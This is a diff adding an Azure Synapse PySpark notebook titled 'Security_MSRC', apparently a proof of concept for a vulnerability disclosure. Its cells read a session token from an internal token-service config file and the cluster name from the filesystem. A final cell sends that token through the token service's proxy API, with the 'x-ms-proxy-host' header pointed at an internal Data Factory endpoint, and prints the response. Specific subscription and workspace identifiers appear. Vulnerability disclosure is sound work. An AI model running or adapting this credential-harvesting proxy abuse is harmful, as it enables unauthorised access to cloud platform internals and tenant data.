@@ -1,0 +1,116 @@
+{
+	"name": "Security_MSRC",
+	"properties": {
+		"nbformat": 4,
+		"nbformat_minor": 2,
+		"sessionProperties": {
+			"driverMemory": "28g",
+			"driverCores": 4,
+			"executorMemory": "28g",
+			"executorCores": 4,
+			"numExecutors": 2,
+			"runAsWorkspaceSystemIdentity": false,
+			"conf": {
+				"spark.dynamicAllocation.enabled": "false",
+				"spark.dynamicAllocation.minExecutors": "2",
+				"spark.dynamicAllocation.maxExecutors": "2",
+				"spark.autotune.trackingId": "d17363d6-139e-4221-9ee0-e72aa271d51a"
+			}
+		},
+		"metadata": {
+			"saveOutput": true,
+			"synapse_widget": {
+				"version": "0.1"
+			},
+			"enableDebugMode": false,
+			"kernelspec": {
+				"name": "synapse_pyspark",
+				"display_name": "Synapse PySpark"
+			},
+			"language_info": {
+				"name": "python"
+			},
+			"sessionKeepAliveTimeout": 30
+		},
+		"cells": [
+			{
+				"cell_type": "code",
+				"metadata": {
+					"microsoft": {
+						"language": "python"
+					}
+				},
+				"source": [
+					"%%pyspark\r\n",
+					"# Fetch session token\r\n",
+					"with open(\"/opt/token-service/tokenservice.config.json\") as f:\r\n",
+					"    sessionToken = f.read()"
+				],
+				"execution_count": 25
+			},
+			{
+				"cell_type": "code",
+				"metadata": {
+					"jupyter": {
+						"source_hidden": false,
+						"outputs_hidden": false
+					},
+					"nteract": {
+						"transient": {
+							"deleting": false
+						}
+					},
+					"microsoft": {
+						"language": "python"
+					}
+				},
+				"source": [
+					"%%pyspark\r\n",
+					"# Fetch cluster id\r\n",
+					"with open(\"/etc/bbc/cluster-name\") as f:\r\n",
+					"    clusterId = f.read()"
+				],
+				"execution_count": 26
+			},
+			{
+				"cell_type": "code",
+				"metadata": {
+					"jupyter": {
+						"source_hidden": false,
+						"outputs_hidden": false
+					},
+					"nteract": {
+						"transient": {
+							"deleting": false
+						}
+					},
+					"microsoft": {
+						"language": "python"
+					}
+				},
+				"source": [
+					"%%pyspark\r\n",
+					"import requests\r\n",
+					"import json\r\n",
+					"\r\n",
+					"sessionTokenJObj = json.loads(sessionToken)\r\n",
+					"tokenServiceUrl = sessionTokenJObj[\"tokenServiceEndpoint\"]\r\n",
+					"fullUrl = \"{0}/api/v1/proxy/subscriptions/4e1adcf4-0906-4efe-bd5d-3659241ab819/resourceGroups/parask/providers/Microsoft.Synapse/workspaces/paraskbrazilsouth/hms/databases/DB1/fetch?api-version=2019-06-01-preview\".format(tokenServiceUrl)\r\n",
+					"headers = {\r\n",
+					"    'x-ms-proxy-host': 'https://rpbrazilsouth.svc.datafactory.azure.com:44433', # SyMS endpoint\r\n",
+					"    'x-ms-cluster-identifier': clusterId,\r\n",
+					"    'Authorization': sessionTokenJObj['sessionToken'],\r\n",
+					"    'Metadata': 'true'\r\n",
+					"}\r\n",
+					"\r\n",
+					"payload = {'ArtifactName': 'DB1', 'HmsRuntimeProperties': { 'SparkSessionToken': sessionTokenJObj['sessionToken'] } }\r\n",
+					"response = requests.post(fullUrl, json=payload, headers=headers)\r\n",
+					"\r\n",
+					"print(response)\r\n",
+					"print(response.text)"
+				],
+				"execution_count": 27
+			}
+		]
+	}
+}
